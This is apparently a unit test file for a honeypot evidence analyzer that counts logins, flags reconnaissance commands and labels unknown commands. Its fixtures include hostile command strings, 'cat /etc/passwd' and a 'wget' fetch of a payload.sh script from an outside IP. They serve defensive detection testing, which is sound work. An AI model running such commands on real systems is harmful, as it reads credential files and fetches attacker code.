import unittest
from unittest.mock import patch

from evidence_analyzer import analyze_session, get_evidence


def make_session(session_id="s1", src_ip="203.0.113.10", dst_port=2222):
    return {
        "session_id": session_id,
        "src_ip": src_ip,
        "dst_port": dst_port,
        "start_time": "2026-11-14 10:00:00",
        "end_time": "2026-11-14 10:05:00",
        "duration_ms": 300000,
    }


def make_login(success, username="root", session_id="s1"):
    return {
        "session_id": session_id,
        "username": username,
        "password": "redacted",
        "success": success,
        "timestamp": "2026-11-14 10:00:01",
    }


def make_command(cmd, session_id="s1"):
    return {
        "session_id": session_id,
        "input": cmd,
        "timestamp": "2026-11-14 10:00:02",
    }


class AnalyzeSessionEmptyAndMalformedTests(unittest.TestCase):
    def test_none_data_returns_none(self):
        self.assertIsNone(analyze_session(None))

    def test_empty_dict_returns_none(self):
        self.assertIsNone(analyze_session({}))

    def test_missing_session_key_returns_none(self):
        self.assertIsNone(analyze_session({"logins": [], "commands": []}))

    def test_session_with_no_logins_or_commands(self):
        result = analyze_session({"session": make_session()})
        self.assertEqual(result["successful_logins"], 0)
        self.assertEqual(result["failed_logins"], 0)
        self.assertEqual(result["total_commands"], 0)
        self.assertEqual(result["commands"], [])
        self.assertEqual(result["reconnaissance_commands"], [])
        self.assertEqual(result["command_analysis"], [])

    def test_command_records_without_input_are_ignored(self):
        data = {
            "session": make_session(),
            "commands": [
                {"session_id": "s1", "timestamp": "2026-11-14 10:00:02"},
                {"session_id": "s1", "input": None, "timestamp": "2026-11-14 10:00:03"},
                make_command("whoami"),
            ],
        }
        result = analyze_session(data)
        self.assertEqual(result["commands"], ["whoami"])
        self.assertEqual(result["total_commands"], 1)

    def test_login_records_without_success_flag_count_as_neither(self):
        data = {
            "session": make_session(),
            "logins": [
                {"session_id": "s1", "username": "root", "timestamp": "t"},
                make_login(1),
            ],
        }
        result = analyze_session(data)
        self.assertEqual(result["successful_logins"], 1)
        self.assertEqual(result["failed_logins"], 0)


class AnalyzeSessionBenignTests(unittest.TestCase):
    def test_successful_login_with_ordinary_commands(self):
        data = {
            "session": make_session(),
            "logins": [make_login(1)],
            "commands": [make_command("ls -la"), make_command("exit")],
        }
        result = analyze_session(data)
        self.assertEqual(result["authentication"], "successful")
        self.assertEqual(result["successful_logins"], 1)
        self.assertEqual(result["total_commands"], 2)

    def test_traceability_fields_come_from_source_session(self):
        data = {"session": make_session(session_id="abc123", src_ip="198.51.100.7", dst_port=22)}
        result = analyze_session(data)
        self.assertEqual(result["session_id"], "abc123")
        self.assertEqual(result["source_ip"], "198.51.100.7")
        self.assertEqual(result["destination_port"], 22)


class AnalyzeSessionSuspiciousTests(unittest.TestCase):
    def test_failed_logins_marked_unsuccessful(self):
        data = {
            "session": make_session(),
            "logins": [make_login(0), make_login(0), make_login(0)],
        }
        result = analyze_session(data)
        self.assertEqual(result["authentication"], "unsuccessful")
        self.assertEqual(result["failed_logins"], 3)

    def test_recon_commands_are_detected(self):
        cmds = ["whoami", "id", "uname -a", "ls -la", "cat /etc/passwd", "exit"]
        data = {
            "session": make_session(),
            "logins": [make_login(1)],
            "commands": [make_command(c) for c in cmds],
        }
        result = analyze_session(data)
        self.assertEqual(
            result["reconnaissance_commands"],
            ["whoami", "id", "uname -a", "ls -la", "cat /etc/passwd"],
        )
        self.assertEqual(result["reconnaissance_count"], 5)

    def test_known_command_meanings_are_mapped(self):
        data = {
            "session": make_session(),
            "commands": [make_command("whoami")],
        }
        result = analyze_session(data)
        self.assertEqual(result["command_analysis"][0]["command"], "whoami")
        self.assertIn("user account", result["command_analysis"][0]["meaning"])


class AnalyzeSessionUnsupportedConclusionTests(unittest.TestCase):
    def test_unknown_command_is_not_described_as_standard(self):
        """An unrecognized command must not be given a reassuring label.

        Labelling e.g. a malware download command as a 'standard'
        shell command is an unsupported, misleading conclusion.
        """
        data = {
            "session": make_session(),
            "commands": [make_command("wget http://203.0.113.9/payload.sh")],
        }
        result = analyze_session(data)
        meaning = result["command_analysis"][0]["meaning"].lower()
        self.assertNotIn("standard", meaning)
        self.assertIn("unrecognized", meaning)

    def test_missing_destination_port_is_not_fabricated(self):
        """A session with no recorded dst_port must not report port 2222."""
        session = make_session()
        del session["dst_port"]
        result = analyze_session({"session": session})
        self.assertIsNone(result["destination_port"])


class GetEvidenceTests(unittest.TestCase):
    def test_returns_none_when_no_sessions_exist(self):
        with patch("evidence_analyzer.get_latest_session", return_value=None):
            self.assertIsNone(get_evidence())

    def test_fetches_specific_session_when_id_given(self):
        data = {"session": make_session(session_id="xyz"), "logins": [], "commands": []}
        with patch("evidence_analyzer.get_session_by_id", return_value=data) as fetch:
            result = get_evidence(session_id="xyz")
            fetch.assert_called_once_with("xyz")
            self.assertEqual(result["session_id"], "xyz")

    def test_returns_none_for_unknown_session_id(self):
        with patch("evidence_analyzer.get_session_by_id", return_value=None):
            self.assertIsNone(get_evidence(session_id="missing"))


if __name__ == "__main__":
    unittest.main()
